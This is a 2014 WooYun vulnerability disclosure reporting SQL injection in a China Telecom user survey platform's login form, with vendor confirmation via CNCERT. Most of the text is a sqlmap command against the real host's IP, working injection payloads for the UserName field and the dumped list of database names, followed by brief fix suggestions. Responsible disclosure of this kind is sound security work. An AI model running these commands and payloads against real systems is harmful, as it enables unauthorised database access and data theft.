wybug_title: 中国电信某处用户调研平台sql注入
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2014-07-27：	细节已通知厂商并且等待厂商处理中									2014-07-31：	厂商已经确认，细节仅向厂商公开									2014-08-10：	细节向核心白帽子及相关领域专家公开									2014-08-20：	细节向普通白帽子公开									2014-08-30：	细节向实习白帽子公开									2014-09-10：	细节向公众公开  简要描述： 中国电信 详细说明：  http://116.228.171.46/
[wooyun@scanf~]# Sqlmap -u "http://116.228.171.46/Home/Login" --data "UserName=admin&Password=admin" --dbs    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 11:58:19[11:58:19] [INFO] resuming back-end DBMS 'microsoft sql server'[11:58:19] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: UserName    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: UserName=admin' AND 1545=CONVERT(INT,(SELECT CHAR(113)+CHAR(108)+CHAR(98)+CHAR(116)+CHAR(113)+(SELECT (CASE WHEN (1545=1545) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(99)+CHAR(117)+CHAR(113))) AND 'jUAj'='jUAj&Password=admin    Type: UNION query    Title: Generic UNION query (NULL) - 1 column    Payload: UserName=admin' UNION ALL SELECT CHAR(113)+CHAR(108)+CHAR(98)+CHAR(116)+CHAR(113)+CHAR(110)+CHAR(102)+CHAR(67)+CHAR(72)+CHAR(67)+CHAR(79)+CHAR(97)+CHAR(72)+CHAR(107)+CHAR(71)+CHAR(113)+CHAR(112)+CHAR(99)+CHAR(117)+CHAR(113)-- &Password=admin    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: UserName=admin'; WAITFOR DELAY '0:0:5'--&Password=admin    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: UserName=admin' WAITFOR DELAY '0:0:5'--&Password=admin---[11:58:19] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 R2 or 7web application technology: ASP.NET 4.0.30319, ASP.NET, Microsoft IIS 7.5back-end DBMS: Microsoft SQL Server 2008[11:58:19] [INFO] fetching database names[11:58:19] [INFO] the SQL query used returns 30 entriesavailable databases [26]:[*] AdventureWorksDW2008[*] ent_ivt[*] IADT30Daily[*] iadt_apidata[*] iAdTracker30[*] iAdTracker30User[*] iAdTracker4Web[*] iBrandChoice2006[*] iBrandChoice2007[*] iBrandChoice2008[*] iKeywordTracker_UP[*] iOneAccount_bak040215[*] iOneAccount_Test[*] iOneAccountNew[*] iTracker[*] iUserTrackerMain[*] iUserTrackerUser_baklemon[*] iutus2[*] ivt_tmpdata[*] master[*] model[*] msdb[*] ReportServer[*] ReportServerTempDB[*] tempdb[*] TemplatesUsers[11:58:19] [INFO] fetched data logged to text files under 'C:\Users\Administrator\.sqlmap\output\116.228.171.46'[*] shutting down at 11:58:19

可以内网渗透的啊！！！怎么屌，没有授权啊，不敢上！！   修复方案：  １过滤UserName２降权数据库３20ranks好吗？   版权声明：转载请注明来源 scanf@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2014-07-31 21:56 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT直接通报给中国电信集团公司处置。 最新状态： 暂无
